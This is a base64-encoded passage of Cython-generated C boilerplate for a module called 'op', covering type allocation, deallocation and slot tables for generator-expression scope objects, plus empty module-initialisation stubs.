Nsb3QodCwgUHlfdHBfYWxsb2MpO1xuICBvID0gYWxsb2NfZnVuYyh0LCAwKTtcbiAgI2Vsc2VcbiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gIGlmIChsaWtlbHkoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByID4gMCkgJiAoaW50KSh0LT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpKSkpIHtcbiAgICBvID0gKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8yb3BfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwclstLV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yb3BfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcl07XG4gICAgbWVtc2V0KG8sIDAsIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSk7XG4gICAgKHZvaWQpIFB5T2JqZWN0X0lOSVQobywgdCk7XG4gICAgUHlPYmplY3RfR0NfVHJhY2sobyk7XG4gIH0gZWxzZVxuICAjZW5kaWZcbiAge1xuICAgIG8gPSAoKnQtPnRwX2FsbG9jKSh0LCAwKTtcbiAgICBpZiAodW5saWtlbHkoIW8pKSByZXR1cm4gMDtcbiAgfVxuICAjZW5kaWZcbiAgcmV0dXJuIG87XG59XG5cbnN0YXRpYyB2b2lkIF9fcHl4X3RwX2RlYWxsb2NfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIoUHlPYmplY3QgKm8pIHtcbiAgc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICopbztcbiAgI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkVcbiAgaWYgKHVubGlrZWx5KChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMDAwIHx8IF9fUHl4X1B5VHlwZV9IYXNGZWF0dXJlKFB5X1RZUEUobyksIFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSkpICYmIF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZmluYWxpemUsIGRlc3RydWN0b3IpKSAmJiAhX19QeXhfUHlPYmplY3RfR0NfSXNGaW5hbGl6ZWQobykpIHtcbiAgICBpZiAoX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9kZWFsbG9jLCBkZXN0cnVjdG9yKSA9PSBfX3B5eF90cF9kZWFsbG9jXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSB7XG4gICAgICBpZiAoUHlPYmplY3RfQ2FsbEZpbmFsaXplckZyb21EZWFsbG9jKG8pKSByZXR1cm47XG4gICAgfVxuICB9XG4gICNlbmRpZlxuICBQeU9iamVjdF9HQ19VblRyYWNrKG8pO1xuICBQeV9DTEVBUihwLT5fX3B5eF9nZW5leHByX2FyZ18wKTtcbiAgUHlfQ0xFQVIocC0+X19weXhfdl9pKTtcbiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gIGlmICgoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByIDwgOCkgJiAoaW50KShQeV9UWVBFKG8pLT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpKSkpIHtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8yb3BfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcltfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIrK10gPSAoKHN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKilvKTtcbiAgfSBlbHNlXG4gICNlbmRpZlxuICB7XG4gICAgI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgICgqUHlfVFlQRShvKS0+dHBfZnJlZSkobyk7XG4gICAgI2Vsc2VcbiAgICB7XG4gICAgICBmcmVlZnVuYyB0cF9mcmVlID0gKGZyZWVmdW5jKVB5VHlwZV9HZXRTbG90KFB5X1RZUEUobyksIFB5X3RwX2ZyZWUpO1xuICAgICAgaWYgKHRwX2ZyZWUpIHRwX2ZyZWUobyk7XG4gICAgfVxuICAgICNlbmRpZlxuICB9XG59XG5cbnN0YXRpYyBpbnQgX19weXhfdHBfdHJhdmVyc2VfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIoUHlPYmplY3QgKm8sIHZpc2l0cHJvYyB2LCB2b2lkICphKSB7XG4gIGludCBlO1xuICBzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgKilvO1xuICB7XG4gICAgZSA9IF9fUHl4X2NhbGxfdHlwZV90cmF2ZXJzZShvLCAxLCB2LCBhKTtcbiAgICBpZiAoZSkgcmV0dXJuIGU7XG4gIH1cbiAgaWYgKHAtPl9fcHl4X2dlbmV4cHJfYXJnXzApIHtcbiAgICBlID0gKCp2KShwLT5fX3B5eF9nZW5leHByX2FyZ18wLCBhKTsgaWYgKGUpIHJldHVybiBlO1xuICB9XG4gIGlmIChwLT5fX3B5eF92X2kpIHtcbiAgICBlID0gKCp2KShwLT5fX3B5eF92X2ksIGEpOyBpZiAoZSkgcmV0dXJuIGU7XG4gIH1cbiAgcmV0dXJuIDA7XG59XG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG5zdGF0aWMgUHlUeXBlX1Nsb3QgX19weXhfdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcl9zbG90c1tdID0ge1xuICB7UHlfdHBfZGVhbGxvYywgKHZvaWQgKilfX3B5eF90cF9kZWFsbG9jXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByfSxcbiAge1B5X3RwX3RyYXZlcnNlLCAodm9pZCAqKV9fcHl4X3RwX3RyYXZlcnNlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByfSxcbiAge1B5X3RwX25ldywgKHZvaWQgKilfX3B5eF90cF9uZXdfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJ9LFxuICB7MCwgMH0sXG59O1xuc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X3R5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHJfc3BlYyA9IHtcbiAgIm9wLl9fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIiLFxuICBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciksXG4gIDAsXG4gIFB5X1RQRkxBR1NfREVGQVVMVHxQeV9UUEZMQUdTX0hBVkVfVkVSU0lPTl9UQUd8UHlfVFBGTEFHU19DSEVDS1RZUEVTfFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJ8UHlfVFBGTEFHU19IQVZFX0dDfFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSxcbiAgX19weXhfdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcl9zbG90cyxcbn07XG4jZWxzZVxuXG5zdGF0aWMgUHlUeXBlT2JqZWN0IF9fcHl4X3R5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIgPSB7XG4gIFB5VmFyT2JqZWN0X0hFQURfSU5JVCgwLCAwKVxuICAib3AuIiJfX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByIiwgXG4gIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKSwgXG4gIDAsIFxuICBfX3B5eF90cF9kZWFsbG9jXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByLCBcbiAgI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA4MDBiNFxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGI0XG4gIDAsIFxuICAjZW5kaWZcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIFB5X1RQRkxBR1NfREVGQVVMVHxQeV9UUEZMQUdTX0hBVkVfVkVSU0lPTl9UQUd8UHlfVFBGTEFHU19DSEVDS1RZUEVTfFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJ8UHlfVFBGTEFHU19IQVZFX0dDfFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSwgXG4gIDAsIFxuICBfX3B5eF90cF90cmF2ZXJzZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwciwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gICNpZiAhQ1lUSE9OX1VTRV9UWVBFX1NQRUNTXG4gIDAsIFxuICAjZW5kaWZcbiAgMCwgXG4gIDAsIFxuICBfX3B5eF90cF9uZXdfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRVxuICAwLCBcbiAgI2Vsc2VcbiAgTlVMTCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiMSAmJiAoIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzA4MDApXG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIF9fUFlYX05FRURfVFBfUFJJTlRfU0xPVCA9PSAxXG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDBcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNFxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwYTAwMDBcbiAgMCwgXG4gICNlbmRpZlxufTtcbiNlbmRpZlxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3RwX25ld18yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcihQeVR5cGVPYmplY3QgKnQsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmEsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmspIHtcbiAgUHlPYmplY3QgKm87XG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gIGFsbG9jZnVuYyBhbGxvY19mdW5jID0gKGFsbG9jZnVuYylQeVR5cGVfR2V0U2xvdCh0LCBQeV90cF9hbGxvYyk7XG4gIG8gPSBhbGxvY19mdW5jKHQsIDApO1xuICAjZWxzZVxuICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFNcbiAgaWYgKGxpa2VseSgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgPiAwKSAmIChpbnQpKHQtPnRwX2Jhc2ljc2l6ZSA9PSBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikpKSkge1xuICAgIG8gPSAoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByWy0tX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByXTtcbiAgICBtZW1zZXQobywgMCwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpKTtcbiAgICAodm9pZCkgUHlPYmplY3RfSU5JVChvLCB0KTtcbiAgfSBlbHNlXG4gICNlbmRpZlxuICB7XG4gICAgbyA9ICgqdC0+dHBfYWxsb2MpKHQsIDApO1xuICAgIGlmICh1bmxpa2VseSghbykpIHJldHVybiAwO1xuICB9XG4gICNlbmRpZlxuICByZXR1cm4gbztcbn1cblxuc3RhdGljIHZvaWQgX19weXhfdHBfZGVhbGxvY18yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcihQeU9iamVjdCAqbykge1xuICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRVxuICBpZiAodW5saWtlbHkoKFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwMDAgfHwgX19QeXhfUHlUeXBlX0hhc0ZlYXR1cmUoUHlfVFlQRShvKSwgUHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFKSkgJiYgX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9maW5hbGl6ZSwgZGVzdHJ1Y3RvcikpICYmICghUHlUeXBlX0lTX0dDKFB5X1RZUEUobykpIHx8ICFfX1B5eF9QeU9iamVjdF9HQ19Jc0ZpbmFsaXplZChvKSkpIHtcbiAgICBpZiAoX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9kZWFsbG9jLCBkZXN0cnVjdG9yKSA9PSBfX3B5eF90cF9kZWFsbG9jXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKSB7XG4gICAgICBpZiAoUHlPYmplY3RfQ2FsbEZpbmFsaXplckZyb21EZWFsbG9jKG8pKSByZXR1cm47XG4gICAgfVxuICB9XG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFNcbiAgaWYgKCgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIgPCA4KSAmIChpbnQpKFB5X1RZUEUobyktPnRwX2Jhc2ljc2l6ZSA9PSBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcikpKSkge1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVsaXN0XzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByW19fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcisrXSA9ICgoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciAqKW8pO1xuICB9IGVsc2VcbiAgI2VuZGlmXG4gIHtcbiAgICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICAgKCpQeV9UWVBFKG8pLT50cF9mcmVlKShvKTtcbiAgICAjZWxzZVxuICAgIHtcbiAgICAgIGZyZWVmdW5jIHRwX2ZyZWUgPSAoZnJlZWZ1bmMpUHlUeXBlX0dldFNsb3QoUHlfVFlQRShvKSwgUHlfdHBfZnJlZSk7XG4gICAgICBpZiAodHBfZnJlZSkgdHBfZnJlZShvKTtcbiAgICB9XG4gICAgI2VuZGlmXG4gIH1cbn1cbiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF90eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByX3Nsb3RzW10gPSB7XG4gIHtQeV90cF9kZWFsbG9jLCAodm9pZCAqKV9fcHl4X3RwX2RlYWxsb2NfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJ9LFxuICB7UHlfdHBfbmV3LCAodm9pZCAqKV9fcHl4X3RwX25ld18yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcn0sXG4gIHswLCAwfSxcbn07XG5zdGF0aWMgUHlUeXBlX1NwZWMgX19weXhfdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcl9zcGVjID0ge1xuICAib3AuX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciIsXG4gIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKSxcbiAgMCxcbiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsXG4gIF9fcHl4X3R5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHJfc2xvdHMsXG59O1xuI2Vsc2Vcblxuc3RhdGljIFB5VHlwZU9iamVjdCBfX3B5eF90eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByID0ge1xuICBQeVZhck9iamVjdF9IRUFEX0lOSVQoMCwgMClcbiAgIm9wLiIiX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciIsIFxuICBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciksIFxuICAwLCBcbiAgX19weXhfdHBfZGVhbGxvY18yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciwgXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwYjRcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiNFxuICAwLCBcbiAgI2VuZGlmXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgMCwgXG4gICNlbmRpZlxuICAwLCBcbiAgMCwgXG4gIF9fcHl4X3RwX25ld18yb3BfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwciwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gIDAsIFxuICAwLCBcbiAgMCwgXG4gICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gIDAsIFxuICAjZWxzZVxuICBOVUxMLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGIxICYmICghQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IFBZUFlfVkVSU0lPTl9OVU0gPj0gMHgwNzAzMDgwMClcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgX19QWVhfTkVFRF9UUF9QUklOVF9TTE9UID09IDFcbiAgMCwgXG4gICNlbmRpZlxuICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMFxuICAwLCBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE0XG4gIDAsIFxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBhMDAwMFxuICAwLCBcbiAgI2VuZGlmXG59O1xuI2VuZGlmXG5cbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZXRob2RzW10gPSB7XG4gIHswLCAwLCAwLCAwfVxufTtcblxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9Jbml0Q2FjaGVkQnVpbHRpbnMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X0luaXRDYWNoZWRDb25zdGFudHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X0luaXRHbG9iYWxzKHZvaWQpOyBcbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfSW5pdENvbnN0YW50cyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpOyBcbnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19QeXhfbW9kaW5pdF9nbG9iYWxfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X3R5cGVfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX1B5eF9tb2Rpbml0X3R5cGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X21vZGluaXRfdmFyaWFibGVfaW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X21vZGluaXRfZnVuY3Rpb25faW1wb3J0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKTsgXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fUHl4X0NyZWF0ZUNvZGVPYmplY3RzKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSk7IFxuXG5cbnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF9nbG9iYWxfaW5pdF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkge1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19QeXhfbW9kaW5pdF9nbG9iYWxfaW5pdF9jb2RlIiwgMCk7XG4gIFxuICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTtcbiAgcmV0dXJuIDA7XG59XG5cbnN0YXRpYyBpbnQgX19QeXhfbW9kaW5pdF92YXJpYWJsZV9leHBvcnRfY29kZShfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfbXN0YXRlKTtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfdmFyaWFibGVfZXhwb3J0X2NvZGUiLCAwKTtcbiAgXG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gMDtcbn1cblxuc3RhdGljIGludCBfX1B5eF9tb2Rpbml0X2Z1bmN0aW9uX2V4cG9ydF9jb2RlKF9fcHl4X21zdGF0ZXR5cGUgKl9fcHl4X21zdGF0ZSkge1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBDWVRIT05fVU5VU0VEX1ZBUihfX3B5eF9tc3RhdGUpO1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9leHBvcnRfY29kZSIsIDApO1xuICBcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiAwO1xufVxuXG5zdGF0aWMgaW50IF9fUHl4X21vZGluaXRfdHlwZV9pbml0X2NvZGUoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIENZVEhPTl9VTlVTRURfVkFSKF9fcHl4X21zdGF0ZSk7XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIl9fUHl4X21vZGluaXRfdHlwZV9pbml0X2NvZGUiLCAwKTtcbiAgXG4gICNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByID0gKFB5VHlwZU9iamVjdCAqKSBfX1B5eF9QeVR5cGVfRnJvbU1vZHVsZUFuZFNwZWMoX19weXhfbSwgJl9fcHl4X3R5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcl9zcGVjLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcilcbiAgaWYgKF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoJl9fcHl4X3R5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcl9zcGVjLCBfX3B5eF9tc3RhdGUtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcilcbiAgI2Vsc2VcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9wdHlwZV8yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByID0gJl9fcHl4X3R5cGVfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcjtcbiAgI2VuZGlmXG4gICNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAjZW5kaWZcbiAgI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgaWYgKF9fUHl4X1B5VHlwZV9SZWFkeShfX3B5eF9tc3RhdGUtPl9